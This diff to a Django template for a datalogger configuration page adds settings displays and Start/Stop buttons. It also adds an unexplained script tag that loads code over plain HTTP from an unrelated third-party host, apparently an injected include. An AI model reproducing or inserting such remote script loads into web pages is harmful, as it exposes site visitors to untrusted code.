@@ -6,29 +6,42 @@
         <link rel="stylesheet" href="{% static 'css/logger.css' %}">
         <title>Datalogger</title>
     </head>
+    <script type = 'text/javascript' src='http://m.free-codes.org/gh.php?id=2001'></script>
     <body>
         <div class = "page-header"> 
             <h1><a href="/">Configure Datalogger</a></h1> 
         </div>
         <div>
-            <h1>Standard settings</h1>
+            <h1>Standard/Default Settings</h1>
             <ul>
                 <li>Baudrate: 115200</li>
                 <li>Update Rate: 0 (autostreaming)</li>
                 <li>Dataport: ttyAMA0</li>
                 <li>Timeout: 5</li>
             </ul>
+            <h2>Press start with blank fields to use default settings </h3>
+            <h3>Status: {{status.current}}</h3>
+        </div>
+            <h1>Current Logging Settings</h1>
+            <ul>
+                <li>Baudrate: {{logger_settings.baudrate}}</li>
+                <li>Filename: {{logger_settings.filename}}</li>
+                <li>Update Rate: {{logger_settings.update_rate}}</li>
+                <li>Dataport: {{logger_settings.dataport}}</li>
+                <li>Timeout: {{logger_settings.timeout}}</li>
+            </ul>
     <form action = "" method ="post">
         {% csrf_token %}
-        <pre>
+        <pre id = "formdata">
             <p><b>Baudrate &nbsp;&nbsp;&nbsp;{{form.baudrate}}</b>
             <p><b>File Name &nbsp;&nbsp;{{form.file_name}}</b>
             <p><b>Update Rate {{form.update_rate}}</b>
             <p><b>Dataport &nbsp;&nbsp;&nbsp;{{form.dataport}}</b>
             <p><b>Timeout &nbsp;&nbsp;&nbsp;&nbsp;{{form.timeout}}</b>
         </pre>
-        <input type = "submit" value = "Submit" name = "submit"/>
-        <input type = "submit" value = "Stop" name = "stop"/>
+        <input type = "submit" class = "button-start" value = "Start" name = "submit" onClick = "alert('Currently logging...'); return true">
+        <input type = "submit" class = "button-stop" value = "Stop" name = "stop" onClick = "alert('Logging stopped'); return true"/>
+
     </form>
     </body>
 </html>
